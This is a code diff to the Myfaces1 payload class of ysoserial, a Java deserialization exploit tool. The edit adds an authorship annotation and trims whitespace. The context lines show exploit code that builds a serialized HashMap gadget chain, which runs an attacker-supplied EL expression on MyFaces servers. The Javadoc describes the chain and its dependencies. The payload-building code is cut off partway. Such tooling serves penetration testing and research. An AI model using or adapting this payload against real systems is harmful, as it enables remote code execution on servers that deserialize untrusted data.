@@ -15,6 +15,7 @@ import org.apache.myfaces.el.CompositeELResolver;
 import org.apache.myfaces.el.unified.FacesELContext;
 import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;
 
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -22,35 +23,36 @@ import ysoserial.payloads.util.Reflections;
 
 
 /**
- * 
+ *
  * ValueExpressionImpl.getValue(ELContext)
  * ValueExpressionMethodExpression.getMethodExpression(ELContext)
  * ValueExpressionMethodExpression.getMethodExpression()
  * ValueExpressionMethodExpression.hashCode()
  * HashMap<K,V>.hash(Object)
  * HashMap<K,V>.readObject(ObjectInputStream)
- * 
+ *
  * Arguments:
  * - an EL expression to execute
- * 
+ *
  * Requires:
  * - MyFaces
  * - Matching EL impl (setup POM deps accordingly, so that the ValueExpression can be deserialized)
- * 
+ *
  * @author mbechler
  */
 @PayloadTest(skip="Requires running MyFaces, no direct execution")
+@Authors({ Authors.MBECHLER })
 public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
 
     public Object getObject ( String command ) throws Exception {
         return makeExpressionPayload(command);
     }
-    
+
 
     public static String[] getDependencies () {
         if ( System.getProperty("el") == null || "apache".equals(System.getProperty("el")) ) {
             return new String[] {
-                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9", 
+                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9",
                 "org.mortbay.jasper:apache-el:8.0.27",
                 "javax.servlet:javax.servlet-api:3.1.0",
 
@@ -59,7 +61,7 @@ public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
             };
         } else if ( "juel".equals(System.getProperty("el")) ) {
             return new String[] {
-                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9", 
+                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9",
                 "de.odysseus.juel:juel-impl:2.2.7", "de.odysseus.juel:juel-api:2.2.7",
                 "javax.servlet:javax.servlet-api:3.1.0",
 
@@ -76,7 +78,7 @@ public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
         ELContext elContext = new FacesELContext(new CompositeELResolver(), fc);
         Reflections.getField(FacesContextImplBase.class, "_elContext").set(fc, elContext);
         ExpressionFactory expressionFactory = ExpressionFactory.newInstance();
-        
+
         ValueExpression ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);
         ValueExpressionMethodExpression e = new ValueExpressionMethodExpression(ve1);
         ValueExpression ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class);
